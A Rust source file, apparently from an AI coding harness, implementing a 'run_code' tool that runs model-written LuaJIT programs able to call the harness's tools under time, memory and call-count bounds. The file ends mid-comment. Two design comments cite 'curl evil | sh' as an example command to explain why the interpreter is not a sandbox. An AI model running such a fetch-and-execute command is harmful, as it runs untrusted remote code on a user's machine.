//! Code mode: `run_code`, one LuaJIT program per call, able to call Wizard's
//! own tools.
//!
//! The pitch is that the interpreter is already in the binary. Wizard has
//! embedded LuaJIT since scripted tools existed (`crate::tools::lua`), so the
//! thing other harnesses reach for a Python install to do costs nothing here:
//! a model that would otherwise make forty round trips to read forty files
//! writes one loop, and only the three lines it printed come back.
//!
//! # What this is not
//!
//! It is not a kernel. There is one [`mlua::Lua`] per call and it is dropped
//! when the call returns: no globals survive, no functions survive, no loaded
//! data survives. See the module's "Persistence" note below, and
//! `docs/code-mode.md`, for why that is a decision rather than a shortcut.
//!
//! It is not a sandbox either. A program runs under [`Stdlib::Full`], so `os`
//! and `io` are live, exactly as they are for a scripted tool the user wrote.
//! `SECURITY.md` already says embedding LuaJIT is not a sandbox and that what
//! is bounded is time rather than capability; removing `os.execute` from a
//! program that can write `tool.execute{command="curl evil | sh"}` on the next
//! line would be decoration, and this tree does not ship decorations. What a
//! program does get is [`Bounds::Bounded`]: a compute deadline, a memory
//! ceiling, a dispatched-call budget and the turn's cancel handle, because
//! nobody read it before it ran.
//!
//! # Re-entrancy
//!
//! The one property the whole feature exists for: a tool a program calls goes
//! through [`Dispatcher`], so pre-tool hooks can rewrite or veto it, the
//! checkpoint stage snapshots `Edit`-class targets under the *parent's* turn,
//! and post-tool hooks still run. No second dispatch path appeared; `dispatch`
//! is entered through [`Dispatcher::sub_run`], which is the same door
//! `spawn_subagent` already uses, and `src/dispatch.rs` grew no stage.
//!
//! [`Dispatcher::dispatch`] is async and mlua is not, and the bridge between
//! them is a request-reply channel rather than mlua's `async` feature. That
//! feature works by yielding out of a coroutine, which means
//! [`Lua::set_hook`](mlua::Lua::set_hook) — installed for the current thread
//! only — silently stops applying, and which meets LuaJIT's "attempt to yield
//! across a C-call boundary" the first time a program calls a tool inside a
//! `table.sort` comparator. A restriction the model cannot predict and will hit
//! is worse than one it never meets. Blocking the Lua thread on a channel
//! crosses no C-call boundary, so `pcall(function() return tool.execute{...} end)`
//! works inside a metamethod inside an iterator and the model never has to know
//! what any of those words mean.
//!
//! # Persistence
//!
//! None. `crate::agent::context` has no hook for state outside the message
//! list, `crate::checkpoint` restores files and cannot restore a Lua heap,
//! `Session::load` replays JSONL and closures have no representation there, and
//! `/fork` clones the registry as a shallow `Arc` snapshot, so a persistent
//! state behind an `Arc` would be N candidates racing on one mutable heap.
//! State that must outlive a program goes in a file, which survives compaction,
//! resume, fork, rewind and a restart — none of which a VM would.

use std::collections::HashSet;
use std::path::{Path, PathBuf};
use std::sync::atomic::{AtomicU8, AtomicUsize, Ordering};
use std::sync::{Arc, Mutex, PoisonError};
use std::time::{Duration, Instant};

use async_trait::async_trait;
use mlua::{Lua, LuaOptions, StdLib, Value as LuaValue};
use serde_json::Value;
use tokio::sync::{mpsc, oneshot};

use crate::agent::turn::Sink;
use crate::dispatch::{Dispatcher, Grade};
use crate::hooks::HookEngine;
use crate::llm::ToolCall;
use crate::tools::lua::{self as luahost, BoundsHandle, Stdlib, StopReason};
use crate::tools::registry::ToolRegistry;
use crate::tools::{
    CommandDispatch, ConsoleAccess, MAX_OUTPUT_BYTES, Tool, ToolAccess, ToolContext, ToolError,
    ToolKind, ToolOutput, truncate_output,
};

/// The tool's advertised name.
pub const RUN_CODE_TOOL_NAME: &str = "run_code";

/// Tools a program must never call.
///
/// The snapshot a program sees already excludes most of these by composition
/// order — it is the `base` registry `spawn_subagent` scopes down from, built
/// before the spawn tool, `evolve`, `publish`, `exit_plan` and `interview` are
/// registered — so this is belt to that snapshot's braces. Listed anyway, with
/// a reason each, so the guarantee survives an edit to the composition order,
/// and modelled on `FORK_TOOL_DENYLIST` for the same purpose.
const PROGRAM_TOOL_DENYLIST: &[&str] = &[
    RUN_CODE_TOOL_NAME,                       // programs do not nest
    crate::tools::compact::COMPACT_TOOL_NAME, // needs the parent loop; errors anyway
    "exit_plan",                              // a program must not leave plan mode
    "interview",                              // nobody is positioned to answer
    "run_command",                            // queues for a surface the program cannot see
];

/// Compute budget when the model does not ask for one.
const DEFAULT_COMPUTE_SECS: u64 = 30;
/// Ceiling on the compute budget the model may ask for.
const MAX_COMPUTE_SECS: u64 = 120;

/// Hard wall clock, never extended by time parked in a tool call.
///
/// [`crate::tools::shell::MAX_TIMEOUT`], so a program cannot outlive the
/// longest single command it could have run. Without it, a program whose every
/// call is slow could push its compute deadline forward forever.
const WALL_CEILING: Duration = crate::tools::shell::MAX_TIMEOUT;

/// Memory a program may hold. Reused rather than re-picked: it is the figure a
/// sandboxed script already gets.
const MEMORY_LIMIT: usize = 64 * 1024 * 1024;

/// Dispatched tool calls one program may make.
///
/// Its own bound because neither of the other two catches the shape it
/// catches: a loop of individually fast calls finishes inside the deadline (the
/// deadline does not count time parked in a call at all) and allocates nothing.
const CALL_BUDGET: usize = 64;

/// How often the pump wakes to see whether an in-VM stop is overdue.
const BACKSTOP_TICK: Duration = Duration::from_millis(250);

/// How long the pump waits for the in-VM stop to land before it gives up on
/// the program.
///
/// `lua::HOOK_GRACE`'s reasoning, applied on this side: the two
/// stops are not equivalent and the better one has to win the race. The hook
/// raises an ordinary Lua error, so the chunk unwinds and the thread ends; the
/// host can only stop *waiting*. Arming them for the same instant would let the
/// host win by a hair every time and abandon threads that were about to stop
/// themselves.
const BACKSTOP_GRACE: Duration = Duration::from_secs(2);

/// Ledger lines shown before the tail is summarised.
const LEDGER_LINES: usize = 20;
/// Characters of a call's arguments kept in its ledger line.
const LEDGER_ARG_CHARS: usize = 120;

/// `run_code` — run a LuaJIT program that can call Wizard's own tools.
pub struct RunCodeTool {
    /// The tool set a program may reach: the `base` registry, snapshotted at
    /// construction. A cheap handle clone (see [`ToolRegistry::clone`]).
    registry: Arc<ToolRegistry>,
    /// The parent's lifecycle hooks, applied to every call a program makes.
    hooks: Arc<HookEngine>,
    /// Advertised description, built once.
    ///
    /// Not shadowable through a harness bundle in v1, and deliberately so:
    /// `crate::harness::export` derives `tool_descriptions/` from
    /// `ToolRegistry::with_native_tools()`, and `run_code` is registered in
    /// `build_tool_registry` instead, so no `run_code.md` is exported and an
    /// override file naming it would be skipped with a warning. Making it
    /// overridable means exporting it, which means exporting a tool most
    /// installs do not have enabled.
    description: String,
}

impl RunCodeTool {
    pub fn new(registry: Arc<ToolRegistry>, hooks: Arc<HookEngine>) -> Self {
        Self {
            registry,
            hooks,
            description: DESCRIPTION.to_string(),
        }
    }

    /// The names a program may call: the snapshot's own roster, minus
    /// [`PROGRAM_TOOL_DENYLIST`], in registration order.
    ///
    /// Derived from `specs()` rather than hand-listed so a newly connected MCP
    /// server is callable from Lua the same day, with no Rust change, and so a
    /// server that went away leaves no stale binding. The host surface is a
    /// rendering of the registry, not a curated list that drifts from it.
    fn callable_names(&self) -> Vec<String> {
        self.registry
            .specs()
            .into_iter()
            .map(|spec| spec.function.name)
            .filter(|name| !PROGRAM_TOOL_DENYLIST.contains(&name.as_str()))
            .collect()
    }
}

/// The whole of the routing guidance, since `WIZARD.md` is not touched: an
/// off-by-default tool must not cost every run charter tokens.
const DESCRIPTION: &str = "\
Run a LuaJIT program that can call Wizard's own tools. Use it when three or more calls would \
otherwise be a fixed sequence, or when the next call's arguments are computable from the previous \
call's output: reading forty files and printing the three that match, or editing every file an MCP \
server names. Do not use it when you need to read a result before deciding what to do next; call \
the tool directly instead.\n\n\
Call tools as `tool.read_file{path=\"src/main.rs\"}`. It returns the tool's result string. A tool \
that ran and reported failure returns `nil, message`. A call that could not be made at all raises; \
wrap it in `pcall` if you mean to probe. `wizard.call(name, args)` is the form that never raises \
and returns `{ok=, content=, status=}`. `wizard.tools()` lists what is callable.\n\n\
Nothing survives the call. Globals, functions and loaded data are gone when it returns, and the \
results of the tools you called never enter your context. Print what you will want later, or write \
it to a file.";

#[async_trait]
impl Tool for RunCodeTool {
    fn name(&self) -> &str {
        RUN_CODE_TOOL_NAME
    }

    fn description(&self) -> &str {
        &self.description
    }

    fn parameters(&self) -> Value {
        serde_json::json!({
            "type": "object",
            "properties": {
                "code": {
                    "type": "string",
                    "description": "A LuaJIT program. Call Wizard's tools with tool.<name>{...}. \
                                    Print what you want to keep."
                },
                "timeout_secs": {
                    "type": "integer",
                    "description": "Compute budget in seconds (default 30, max 120). Time spent \
                                    inside a tool call does not count against it."
                }
            },
            "required": ["code"]
        })
    }

    /// `Execute`, and that is load-bearing rather than cosmetic: the plan-mode
    /// gate refuses the whole tool while planning, before a line of Lua runs,
    /// with the message that names `exit_plan`. That is why the inner pipeline
    /// needs no plan gate of its own — the outer refusal is stronger than one
    /// an inner gate could give, because it happens before anything happened.
    fn access(&self) -> ToolAccess {
        ToolAccess::Execute
    }

    fn kind(&self) -> ToolKind {
        ToolKind::Native
    }

    async fn execute(&self, args: Value, ctx: &ToolContext) -> Result<ToolOutput, ToolError> {
        let args: RunCodeArgs = crate::tools::parse_args(RUN_CODE_TOOL_NAME, args)?;
        if args.code.trim().is_empty() {
            return Err(ToolError::InvalidArgs {
                tool: RUN_CODE_TOOL_NAME.to_string(),
                message: "code must be a non-empty LuaJIT program".to_string(),
            });
        }
        let budget = Duration::from_secs(
            args.timeout_secs
                .unwrap_or(DEFAULT_COMPUTE_SECS)
                .clamp(1, MAX_COMPUTE_SECS),
        );

        let started = Instant::now();
        let bounds = BoundsHandle {
            deadline: Arc::new(Mutex::new(started + budget)),
            wall: started + WALL_CEILING,
            memory_limit: MEMORY_LIMIT,
            stop: Arc::new(AtomicU8::new(StopReason::None.as_u8())),
            cancel: ctx.cancel.clone(),
        };
        let stop = Arc::clone(&bounds.stop);
        let deadline = Arc::clone(&bounds.deadline);
        let wall = bounds.wall;
        let denial: Arc<Mutex<Option<Denial>>> = Arc::new(Mutex::new(None));

        // Held out here rather than inside `run_program` so the backstop below
        // can still report what a program printed when the program itself is
        // never going to hand it back.
        let printed: Arc<Mutex<String>> = Arc::new(Mutex::new(String::new()));

        // Depth 1: `Dispatcher::dispatch` takes `&mut self`, so inner calls are
        // serialized however deep the channel is.
        let (tx, mut requests) = mpsc::channel::<CallRequest>(1);
        let worker = tokio::task::spawn_blocking({
            let code = args.code;
            let cwd = ctx.cwd.clone();
            let names = self.callable_names();
            let denial = Arc::clone(&denial);
            let printed = Arc::clone(&printed);
            move || run_program(code, cwd, names, tx, bounds, denial, printed)
        });

        // A clone, not `ToolContext::new(&ctx.cwd)`. That single line is what
        // keeps `checkpoints`, `todos`, `tasks`, `subagents`, `images`, `usage`,
        // `web` and `cancel` wired for every tool a program calls; a fresh
        // context compiles and silently drops `/rewind` coverage for a
        // program's edits.
        let inner_ctx = ToolContext {
            events: None,
            // A program has no surface to drive; it must never dispatch the
            // parent's slash commands even if the parent's ctx enabled it.
            command_dispatch: CommandDispatch::None,
            // Nor does it have a human positioned to answer: an inner `execute`
            // keeps /dev/null on fd 0.
            console: ConsoleAccess::None,
            ..ctx.clone()
        };
        // `Sink::Run`'s own doc calls it a run "named for the log lines it
        // writes instead of the events it has no shape for", which is exactly
        // this: `events: None` because the only events that rail carries are
        // `AgentEvent::SubagentRun*`, and emitting those for something that is
        // not a subagent would put a lie in the transcript and a phantom
        // subagent pane in the TUI. The ledger is what the model reads.
        let sink = Sink::Run {
            run: crate::agent::subagent::next_run_id(),
            name: "code".to_string(),
            events: None,
        };
        let mut inner = Dispatcher::sub_run((*self.registry).clone(), Arc::clone(&self.hooks));

        let mut ledger: Vec<CallRecord> = Vec::new();
        let mut parked_total = Duration::ZERO;
        // When the in-VM stop was first owed, so it gets [`BACKSTOP_GRACE`] to
        // land before the host stops waiting.
        let mut overdue_since: Option<Instant> = None;
        let mut abandoned = false;
        // The in-VM hook is the better stop and has to win this race: it raises
        // an ordinary Lua error, so the chunk unwinds, the thread ends, and
        // nothing is left holding anything. The backstop exists only for the
        // case the hook cannot reach — a chunk parked in a C call, where no hook
        // fires — and for that case there is no third option. This loop used to
        // have no timer at all, on the reasoning that every bound is enforced
        // in-VM; `os.execute("sleep 99999")` is a bound that is not, and the
        // result was a turn that never ended, that Ctrl-C could not reach,
        // because the pump's own cancel and wall checks below only run when a
        // request arrives and a program parked in a C call sends none. A thread
        // that outlives its program is what `run_scripted` has always accepted
        // here; a session that never returns is worse.
        loop {
            let request = tokio::select! {
                biased;
                received = requests.recv() => match received {
                    Some(request) => request,
                    // The sender lives inside the Lua closures, so this is the
                    // program having finished and its state having dropped.
                    None => break,
                },
                _ = tokio::time::sleep(BACKSTOP_TICK) => {
                    let owed = ctx.cancel.as_ref().is_some_and(|c| c.is_cancelled())
                        || Instant::now()
                            >= (*deadline.lock().unwrap_or_else(PoisonError::into_inner)).min(wall);
                    match (owed, overdue_since) {
                        (true, Some(since)) if since.elapsed() >= BACKSTOP_GRACE => {
                            abandoned = true;
                            break;
                        }
                        (true, Some(_)) => {}
                        (true, None) => overdue_since = Some(Instant::now()),
                        // A deadline that moved forward because a tool call took
                        // time is not an overrun any more.
                        (false, _) => overdue_since = None,
                    }
                    continue;
                }
            };
            let refusal = if ctx.cancel.as_ref().is_some_and(|c| c.is_cancelled()) {
                stop.store(StopReason::Interrupted.as_u8(), Ordering::SeqCst);
                Some("the user stopped the turn".to_string())
            } else if Instant::now() >= wall {
                stop.store(StopReason::Time.as_u8(), Ordering::SeqCst);
                Some(format!(
                    "the program outlived its {}s wall-clock ceiling",
                    WALL_CEILING.as_secs()
                ))
            } else {
                None
            };
            if let Some(message) = refusal {
                // The stop flag is set *before* the reply, so the raise this
                // produces classifies from the flag and not from the denial
                // slot the host closure is about to fill in.
                let _ = request.reply.send(Reply::Fault { message });
                continue;
            }

            let record_name = request.call.function.name.clone();
            let record_args = short_args(&request.call.function.arguments);
            let parked = Instant::now();
            let outcome = inner.dispatch(&request.call, &inner_ctx, &sink).await;
            let elapsed = parked.elapsed();
            parked_total += elapsed;
            // The budget is compute time. A program that runs a two-minute
            // build must not blow a thirty-second budget while parked on this
            // channel: the hook cannot fire while the Lua thread is blocked, so
            // the deadline it enforces moves by exactly the time the chunk did
            // not have.
            *deadline.lock().unwrap_or_else(PoisonError::into_inner) += elapsed;

            let (reply, result) = match outcome.output {
                Some(output) => match outcome.grade {
                    Grade::Fine => {
                        let bytes = output.content.len();
                        (
                            Reply::Ran {
                                content: output.content,
                                is_error: false,
                            },
                            RecordResult::Ok(bytes),
                        )
                    }
                    Grade::Reported => {
                        let bytes = output.content.len();
                        (
                            Reply::Ran {
                                content: output.content,
                                is_error: true,
                            },
                            RecordResult::Reported(bytes),
                        )
                    }
                    Grade::Fault => (
                        Reply::Fault {
                            message: output.content,
                        },
                        RecordResult::Denied,
                    ),
                },
                // Only reachable if a sink with a live channel loses its
                // receiver, which this sink does not have. Answered rather
                // than dropped so the program unwinds instead of parking.
                None => (
                    Reply::Fault {
                        message: "the turn ended while the program was running".to_string(),
                    },
                    RecordResult::Denied,
                ),
            };
            ledger.push(CallRecord {
                name: record_name,
                args: record_args,
                result,
            });
            let _ = request.reply.send(reply);
        }

        let (outcome, reason) = if abandoned {
            // Read before the receiver goes, because dropping it makes the
            // worker's next `blocking_send` fail, and that path latches
            // `Interrupted` over whatever this was.
            let reason = if ctx.cancel.as_ref().is_some_and(|c| c.is_cancelled()) {
                StopReason::Interrupted
            } else {
                StopReason::Time
            };
            // The one thing the host can still say to the worker: dropping the
            // receiver makes its next tool call fail rather than park. There is
            // nothing stronger — a foreign Lua stack cannot be aborted — so the
            // join handle is dropped and the thread finishes its C call in its
            // own time. Nothing of the parent's is in its hands: the
            // `ToolContext` clone belongs to this future, not to the worker.
            drop(requests);
            drop(worker);
            let outcome = ProgramOutcome::Threw {
                printed: printed
                    .lock()
                    .map(|guard| guard.clone())
                    .unwrap_or_default(),
                message: "the program stopped answering: it is parked in a call the \
                          in-VM bounds cannot interrupt, so it was left running"
                    .to_string(),
            };
            (outcome, reason)
        } else {
            let outcome = worker.await.map_err(|err| ToolError::Execution {
                tool: RUN_CODE_TOOL_NAME.to_string(),
                source: anyhow::Error::new(err).context("the LuaJIT worker panicked"),
            })?;
            (outcome, StopReason::from_u8(stop.load(Ordering::SeqCst)))
        };

        let denial = denial.lock().unwrap_or_else(PoisonError::into_inner).take();
        let kind = classify(&outcome, reason, denial.is_some());
        let compute = started.elapsed().saturating_sub(parked_total);
        render(kind, outcome, &ledger, denial.as_ref(), compute, budget)
    }
}

#[derive(serde::Deserialize)]
struct RunCodeArgs {
    code: String,
    #[serde(default)]
    timeout_secs: Option<u64>,
}

// -- the bridge ------------------------------------------------------------

/// One dispatched call, on its way from the Lua thread to the pump.
struct CallRequest {
    call: ToolCall,
    reply: oneshot::Sender<Reply>,
}

/// What the pump sends back. Two arms because there are two things that can
/// have happened, and Lua has to tell them apart: a tool that ran, whatever it
/// reported, versus a call that never happened at all.
enum Reply {
    Ran { content: String, is_error: bool },
    Fault { message: String },
}

/// A refused call, kept so the failure body can name it.
struct Denial {
    tool: String,
    args: String,
    reason: String,
}

/// One line of the ledger the model reads to know what already happened.
struct CallRecord {
    name: String,
    args: String,
    result: RecordResult,
}

enum RecordResult {
    Ok(usize),
    Reported(usize),
    Denied,
}

/// What the blocking half has to say when it returns.
enum ProgramOutcome {
    /// The chunk would not parse, so nothing in it ran. True by construction:
    /// `into_function` strictly precedes the call.
    Compiled(String),
    /// The chunk ran and raised. *Why* it raised is [`classify`]'s job and is
    /// read from the stop flag, never from this string.
    Threw {
        printed: String,
        message: String,
    },
    Ok {
        printed: String,
        returned: String,
    },
}

/// Build the state, install the host surface, run the program, and drop the
/// state before returning.
///
/// The drop is not tidiness. `requests.recv()` yielding `None` is the only
/// signal the pump has that the program is finished, and the sender lives
/// inside the Lua closures, which live inside the `Lua`. If anything outlives
/// this function holding either, the pump waits forever and Wizard hangs. The
/// inner scope is what guarantees it: every mlua value is a local declared
/// after `lua`, so all of them drop before it does.
fn run_program(
    code: String,
    cwd: PathBuf,
    names: Vec<String>,
    tx: mpsc::Sender<CallRequest>,
    bounds: BoundsHandle,
    denial: Arc<Mutex<Option<Denial>>>,
    printed: Arc<Mutex<String>>,
) -> ProgramOutcome {
    let lua = match Lua::new_with(StdLib::ALL_SAFE, LuaOptions::default()) {
        Ok(lua) => lua,
        Err(err) => {
            return ProgramOutcome::Compiled(format!("could not create a LuaJIT state: {err}"));
        }
    };

    // A host surface that will not install means nothing ran, which is what
    // the compile arm says. It takes an allocation failure to get here.
    if let Err(err) = build_state(&lua, &cwd, &names, tx, &bounds, &denial, &printed) {
        return ProgramOutcome::Compiled(format!("the host surface could not be installed: {err}"));
    }

    let function = match lua.load(&code).set_name("@run_code").into_function() {
        Ok(function) => function,
        Err(err) => return ProgramOutcome::Compiled(err.to_string()),
    };

    let result = function.call::<LuaValue>(());
    let buffered = printed
        .lock()
        .map(|guard| guard.clone())
        .unwrap_or_default();
    match result {
        Err(err) => ProgramOutcome::Threw {
            printed: buffered,
            message: err.to_string(),
        },
        Ok(value) => {
            let returned = match value {
                LuaValue::Nil => String::new(),
                other => luahost::lua_value_to_json_string(&lua, other)
                    .unwrap_or_else(|err| err.to_string()),
            };
            ProgramOutcome::Ok {
                printed: buffered,
                returned,
            }
        }
    }
}

/// Everything the program can see, installed in the order the pieces depend on
/// each other: bounds first (the JIT has to go off before the hook), then
/// `print`, then the scripted-tool globals, then the dispatching surface on top
/// of the `wizard` table `install_wizard_lib` just created.
fn build_state(
    lua: &Lua,
    cwd: &Path,
    names: &[String],
    tx: mpsc::Sender<CallRequest>,
    bounds: &BoundsHandle,
    denial: &Arc<Mutex<Option<Denial>>>,
    printed: &Arc<Mutex<String>>,
) -> mlua::Result<()> {
    luahost::install_bounds(lua, bounds)?;
    take_os_exit(lua)?;
    luahost::install_print_into(lua, printed)?;
    // Empty rather than absent so a model copying scripted-tool idiom does not
    // nil-index its way into a runtime error on line one.
    let empty = lua.create_table()?;
    lua.globals().set("args", empty)?;
    lua.globals().set("cwd", luahost::cwd_string(cwd))?;
    // `Stdlib::Full`, so `wizard.read_file`/`write_file` keep the meaning they
    // have had in every scripted tool ever written: a raw filesystem call no
    // hook sees and no checkpoint covers. Giving those names a second meaning
    // inside a program is how you get a helper that behaves differently
    // depending on who called it. The dispatched read is `tool.read_file`, and
    // the namespace is the whole of the distinction.
    luahost::install_wizard_lib(lua, cwd, Stdlib::Full)?;
    install_host_surface(lua, names, tx, bounds, denial)
}

/// Take `os.exit` away from a program.
///
/// The rest of `os` stays, and that is the documented trade: a program that can
/// write `tool.execute{command="curl evil | sh"}` gains nothing from losing
/// `os.execute`, so removing it would be decoration. `os.exit` is the one
/// exception, because it is not decoration — there is no `tool.exit`, so it is
/// the only call a program has that reaches past its own bounds and ends the
/// host. `os.exit(3)` really did terminate the whole process: the TUI, the
/// session and any in-flight work, with no error surfaced to anyone, and
/// finishing a script with `os.exit(0)` is ordinary model-written idiom.
fn take_os_exit(lua: &Lua) -> mlua::Result<()> {
    if let Ok(os) = lua.globals().get::<mlua::Table>("os") {
        os.set("exit", LuaValue::Nil)?;
    }
    Ok(())
}

/// `tool.<name>{...}`, `wizard.call`, `wizard.tools`.
fn install_host_surface(
    lua: &Lua,
    names: &[String],
    tx: mpsc::Sender<CallRequest>,
    bounds: &BoundsHandle,
    denial: &Arc<Mutex<Option<Denial>>>,
) -> mlua::Result<()> {
    let callable: Arc<HashSet<String>> = Arc::new(names.iter().cloned().collect());
    let calls = Arc::new(AtomicUsize::new(0));
    let stop = Arc::clone(&bounds.stop);

    // `tool` is an empty table with an `__index` metamethod rather than a
    // pre-populated one, for two reasons: a snapshot taken after MCP
    // attachment needs no per-tool Rust binding, and indexing a name that is
    // not there fails where the model wrote it instead of returning nil and
    // failing one line later as "attempt to call a nil value".
    let tool_table = lua.create_table()?;
    let meta = lua.create_table()?;
    let index = {
        let callable = Arc::clone(&callable);
        let tx = tx.clone();
        let stop = Arc::clone(&stop);
        let calls = Arc::clone(&calls);
        let denial = Arc::clone(denial);
        lua.create_function(move |lua, (_table, key): (mlua::Table, String)| {
            if !callable.contains(&key) {
                return Err(mlua::Error::runtime(format!(
                    "unknown tool '{key}'; call wizard.tools() for the roster"
                )));
            }
            let name = key;
            let tx = tx.clone();
            let stop = Arc::clone(&stop);
            let calls = Arc::clone(&calls);
            let denial = Arc::clone(&denial);
            lua.create_function(move |lua, args: LuaValue| {
                let args = args_to_json(lua, args)?;
                match dispatch_from_lua(&name, args, &tx, &stop, &calls, &denial)? {
                    // The tool ran and said yes: the string, and nothing else,
                    // so `print(tool.read_file{...})` prints a file rather than
                    // a file and the word nil.
                    Reply::Ran {
                        content,
                        is_error: false,
                    } => Ok(mlua::MultiValue::from_vec(vec![LuaValue::String(
                        lua.create_string(&content)?,
                    )])),
                    // The tool ran and the news is unwelcome. `nil, message`,
                    // never a raise: a failing build is diagnostic signal, and
                    // `src/dispatch.rs` spends forty lines arguing it must not
                    // be treated as a malfunction.
                    Reply::Ran {
                        content,
                        is_error: true,
                    } => Ok(mlua::MultiValue::from_vec(vec![
                        LuaValue::Nil,
                        LuaValue::String(lua.create_string(&content)?),
                    ])),
                    // Nothing happened on the machine, so nothing downstream is
                    // computing on real data. Raise, and let `pcall` catch it if
                    // the program meant to probe.
                    Reply::Fault { message } => Err(mlua::Error::runtime(message)),
                }
            })
        })?
    };
    meta.set("__index", index)?;
    tool_table.set_metatable(Some(meta))?;
    lua.globals().set("tool", tool_table)?;

    let wizard: mlua::Table = lua.globals().get("wizard")?;

    // The probing form: a status table, never a raise, for the idiom that
    // needs a value rather than a traceback. `status` is `Grade` surfaced, not
    // a second taxonomy.
    let call = {
        let callable = Arc::clone(&callable);
        let tx = tx.clone();
        let stop = Arc::clone(&stop);
        let calls = Arc::clone(&calls);
        let denial = Arc::clone(denial);
        lua.create_function(
            move |lua, (name, args): (String, LuaValue)| -> mlua::Result<mlua::Table> {
                let refuse = |reason: String| -> mlua::Result<mlua::Table> {
                    let table = lua.create_table()?;
                    table.set("ok", false)?;
                    table.set("status", "denied")?;
                    table.set("content", reason)?;
                    Ok(table)
                };
                if !callable.contains(&name) {
                    return refuse(format!(
                        "unknown tool '{name}'; call wizard.tools() for the roster"
                    ));
                }
                let args = match args_to_json(lua, args) {
                    Ok(args) => args,
                    Err(err) => return refuse(err.to_string()),
                };
                // The two errors this can still raise are not grades: the call
                // budget is spent, or the host has gone away. A program that
                // hit either cannot make progress by reading a table about it.
                let reply = dispatch_from_lua(&name, args, &tx, &stop, &calls, &denial)?;
                let table = lua.create_table()?;
                match reply {
                    Reply::Ran { content, is_error } => {
                        table.set("ok", !is_error)?;
                        table.set("status", if is_error { "reported" } else { "ok" })?;
                        table.set("content", content)?;
                    }
                    Reply::Fault { message } => {
                        table.set("ok", false)?;
                        table.set("status", "denied")?;
                        table.set("content", message)?;
                    }
                }
                Ok(table)
            },
        )?
    };
    wizard.set("call", call)?;

    let roster = names.to_vec();
    let tools = lua.create_function(move |lua, ()| {
        let table = lua.create_table()?;
        for (index, name) in roster.iter().enumerate() {
            table.set(index + 1, name.as_str())?;
        }
        Ok(table)
    })?;
    wizard.set("tools", tools)?;
    Ok(())
}

/// Send one call to the pump and block until it answers.
///
/// `blocking_send` / `blocking_recv` are the supported way to talk to a runtime
/// from a thread that is not one of its workers, and a `spawn_blocking` thread
/// is exactly that.
///
/// `Err` here is terminal: the program cannot continue, and the stop flag has
/// already been set to say why, so the caller classifies from the flag rather
/// than from the message it is about to raise.
fn dispatch_from_lua(
    name: &str,
    args: Value,
    tx: &mpsc::Sender<CallRequest>,
    stop: &Arc<AtomicU8>,
    calls: &Arc<AtomicUsize>,
    denial: &Arc<Mutex<Option<Denial>>>,
) -> mlua::Result<Reply> {
    if calls.fetch_add(1, Ordering::SeqCst) >= CALL_BUDGET {
        stop.store(StopReason::Calls.as_u8(), Ordering::SeqCst);
        return Err(mlua::Error::runtime(format!(
            "more than {CALL_BUDGET} tool calls"
        )));
    }
    let short = short_args(&args);
    let (reply_tx, reply_rx) = oneshot::channel();
    let request = CallRequest {
        call: ToolCall::new(name, args),
        reply: reply_tx,
    };
    // Both of these fail when the pump is gone: the whole `execute` future was
    // dropped (turn abort), or it panicked. Raising with the interrupted flag
    // set unwinds the chunk instead of parking this thread on an answer that
    // will never come.
    if tx.blocking_send(request).is_err() {
        stop.store(StopReason::Interrupted.as_u8(), Ordering::SeqCst);
        return Err(mlua::Error::runtime(
            "the host stopped answering tool calls",
        ));
    }
    let reply = match reply_rx.blocking_recv() {
        Ok(reply) => reply,
        Err(_) => {
            stop.store(StopReason::Interrupted.as_u8(), Ordering::SeqCst);
            return Err(mlua::Error::runtime(
                "the host stopped answering tool calls",
            ));
        }
    };
    // The denial slot, set on a fault and cleared on anything else. It is what
    // makes "a tool call inside the program was refused" distinguishable from
    // "the program raised", without either of them being decided by matching
    // on message text.
    let mut slot = denial.lock().unwrap_or_else(PoisonError::into_inner);
    *slot = match &reply {
        Reply::Fault { message } => Some(Denial {
            tool: name.to_string(),
            args: short,
            reason: message.clone(),
        }),
        Reply::Ran { .. } => None,
    };
    drop(slot);
    Ok(reply)
}

/// Lua's call sugar (`tool.read_file{path="x"}`) hands over one table, which
/// maps exactly onto the JSON object the tool's schema wants.
fn args_to_json(lua: &Lua, value: LuaValue) -> mlua::Result<Value> {
    let json = match value {
        LuaValue::Nil => return Ok(Value::Object(serde_json::Map::new())),
        other => luahost::lua_to_json(lua, other)?,
    };
    match json {
        Value::Object(_) => Ok(json),
        // An empty Lua table has no way to say whether it meant `{}` or `[]`.
        Value::Array(items) if items.is_empty() => Ok(Value::Object(serde_json::Map::new())),
        Value::Null => Ok(Value::Object(serde_json::Map::new())),
        _ => Err(mlua::Error::runtime(
            "tool arguments must be a table, as in tool.read_file{path=\"src/main.rs\"}",
        )),
    }
}

// -- classification and rendering ------------------------------------------

/// One of the seven ways a `run_code` call can end, plus success. A closed
/// list: nothing else may be returned, and the model reacts to the header
/// token.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Kind {
    Ok,
    Compile,
    Error,
    Denied,
    Time,
    Memory,
    Calls,
    Interrupted,
}

/// Decide which one happened, from flags and never from message text.
///
/// This is the single most important function in the file. `mlua::Error::runtime`
/// looks identical for a timeout, a memory cap, a spent call budget and an
/// ordinary `error()` call, and a program can `error("exceeded its time budget")`
/// on purpose. The tempting fix is `contains("time budget")`, which is wrong in
/// exactly the case the model can trigger.
fn classify(outcome: &ProgramOutcome, stop: StopReason, denied: bool) -> Kind {
    // A latched flag outranks how the chunk happened to return. It used to be
    // read on the `Threw` arm alone, so a program that caught its own bound and
    // carried on — `pcall(function() while true do end end)`, the idiom the
    // tool description tells the model to write — returned normally and was
    // reported `run_code ok`, with the timeout sitting in the output body as if
    // it were something the program had printed on purpose. The same shape
    // spent the call budget: after the 64th call every further one raises, a
    // `pcall` around them turns each raise into a value, and the program ends
    // having silently done a fraction of its work.
    let stopped = match stop {
        StopReason::Time => Some(Kind::Time),
        StopReason::Memory => Some(Kind::Memory),
        StopReason::Calls => Some(Kind::Calls),
        StopReason::Interrupted => Some(Kind::Interrupted),
        StopReason::None => None,
    };
    match outcome {
        // True by construction rather than by claim: parsing strictly precedes
        // the call, so a chunk that would not compile cannot have run.
        ProgramOutcome::Compiled(_) => Kind::Compile,
        ProgramOutcome::Ok { .. } => stopped.unwrap_or(Kind::Ok),
        // A program that `pcall`s a denial and then raises for its own reason
        // with no further call in between is reported as denied, which is the
        // honest reading of why it stopped.
        ProgramOutcome::Threw { .. } => {
            stopped.unwrap_or(if denied { Kind::Denied } else { Kind::Error })
        }
    }
}

/// Assemble the model-facing result.
///
/// `truncate_output` is applied to whichever of the print buffer and the return
/// value is actually shown, before the envelope is built, so the header and the
/// ledger are never the thing that gets cut. Capping the print buffer alone left
